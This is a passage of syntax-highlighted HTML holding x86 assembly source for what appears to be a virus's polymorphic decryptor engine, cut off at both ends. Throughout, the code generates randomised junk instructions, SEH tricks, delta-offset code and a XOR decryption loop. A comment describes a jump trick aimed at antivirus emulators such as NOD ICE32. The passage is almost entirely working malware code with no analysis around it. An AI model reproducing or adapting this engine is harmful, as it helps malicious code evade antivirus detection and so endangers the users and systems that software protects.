    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;get random number</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_byte_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc0">                </span><span class="sc1">;generate INC DWORD PTR</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_dw_</span><span class="sc0">
</span><span class="sc5">_byte_</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">                </span><span class="sc1">;generate INC BYTE PTR</span><span class="sc0">
</span><span class="sc5">_dw_</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;store register</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc0">                </span><span class="sc1">;generate JUMP SHORT</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">24d</span><span class="sc0">                </span><span class="sc1">;generate jump to start of code (trick</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">;for better emulators, e.g. NODICE32)</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;generate junx</span><span class="sc0">
</span><span class="sc5">greg1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">                </span><span class="sc1">;generate random register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">;MUST NOT be EBP</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;store it</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">               </span><span class="sc1">;generate XOR,SUB reg, reg or MOV reg, 0</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc0">             </span><span class="sc1">;next SEH instructions</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8fh</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">                </span><span class="sc1">;generate CALL</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;store for l8r use</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;call junk generator</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">                </span><span class="sc1">;random register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;random number (0-1)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">next_delta</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8bh</span><span class="sc0">             </span><span class="sc1">;generate MOV reg, [ESP]; POP EAX</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bdelta</span><span class="sc0">

</span><span class="sc5">next_delta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;generate POP reg; SUB reg, ...</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
</span><span class="sc5">bdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;random junx</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">;parameter (first execution only)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg2</span><span class="sc0">              </span><span class="sc1">;generate MOV sourcereg, ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;generate ADD sourcereg, deltaoffset</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">               </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">               </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;store EBX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg2</span><span class="sc0">              </span><span class="sc1">;generate MOV countreg, ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">;store count register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;restore EBX</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg3</span><span class="sc0">              </span><span class="sc1">;generate MOV keyreg, ...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;store this position for jump to decryptor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">             </span><span class="sc1">;generate XOR [sourcereg], keyreg</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">              </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">               </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                  </span><span class="sc1">;this stuff will choose ordinary of calls</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;to code generators</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g5</span><span class="sc0">                   </span><span class="sc1">;GREG4 - key incremention</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;GREG5 - source incremention</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g1</span><span class="sc0">                   </span><span class="sc1">;GREG6 - count decremention</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">;GREG7 - decryption loop</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">g4</span><span class="sc0">

</span><span class="sc5">g0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gg1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg6</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_end</span><span class="sc0">
</span><span class="sc5">g1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gg2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg5</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_end</span><span class="sc0">
</span><span class="sc5">g2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gg2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_end</span><span class="sc0">
</span><span class="sc5">g3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg5</span><span class="sc0">
</span><span class="sc5">gg3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg6</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_out</span><span class="sc0">
</span><span class="sc5">g4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg6</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gg1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_end</span><span class="sc0">
</span><span class="sc5">g5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg6</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg5</span><span class="sc0">
</span><span class="sc5">g_out</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg4</span><span class="sc0">
</span><span class="sc5">g_end</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">             </span><span class="sc1">;generate POPAD instruction</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;junk instruction generator</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">                </span><span class="sc1">;RET instruction</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;calculate size of decryptor and encrypted data</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;store it to EAX register</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all regs</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and thats all folx</span><span class="sc0">
</span><span class="sc5">get_reg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                    </span><span class="sc1">;this procedure generates random register</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                  </span><span class="sc1">;random number (0-7)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">              </span><span class="sc1">;MUST NOT be 0 (=EAX is used as junk register)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100b</span><span class="sc0">                </span><span class="sc1">;MUST NOT be ESP</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">get_reg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">make_xor</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                   </span><span class="sc1">;this procedure will generate instruction, that</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">;will nulify register (BL as parameter)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_sub_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_mov_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc0">             </span><span class="sc1">;generate XOR reg, reg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_xor_</span><span class="sc0">
</span><span class="sc5">_sub_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2bh</span><span class="sc0">             </span><span class="sc1">;generate SUB reg, reg</span><span class="sc0">
</span><span class="sc5">_xor_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">_mov_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">              </span><span class="sc1">;generate MOV reg, 0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">make_xor</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">gg1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">greg5</span><span class="sc0">
</span><span class="sc5">gg2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">greg4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">greg6</span><span class="sc0">

</span><span class="sc5">random</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">                    </span><span class="sc1">;this procedure will generate random number</span><span class="sc0">
                        </span><span class="sc1">;in range from 0 to pushed_parameter-1</span><span class="sc0">
                        </span><span class="sc1">;0 = do not truncate result</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;save EDX</span><span class="sc0">
        </span><span class="sc5">RDTCS</span><span class="sc0">                   </span><span class="sc1">;RDTCS instruction - reads PCs tix and stores</span><span class="sc0">
                        </span><span class="sc1">;number of them into pair EDX:EAX</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;nulify EDX, we need only EAX</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">            </span><span class="sc1">;is parameter==0 ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">r_out</span><span class="sc0">                </span><span class="sc1">;yeah, do not truncate result</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;divide it</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">;remainder as result</span><span class="sc0">
</span><span class="sc5">r_out</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;restore EDX</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc5">Pshd</span><span class="sc0">                </span><span class="sc1">;quit procedure and destroy pushed parameter</span><span class="sc0">
</span><span class="sc5">random</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">make_xor2</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                  </span><span class="sc1">;create XOR instruction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">make_xor2</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">greg2</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">                    </span><span class="sc1">;1 parameter = source/count value</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">                </span><span class="sc1">;get register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;already used ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get parameter</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                  </span><span class="sc1">;choose instructions</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
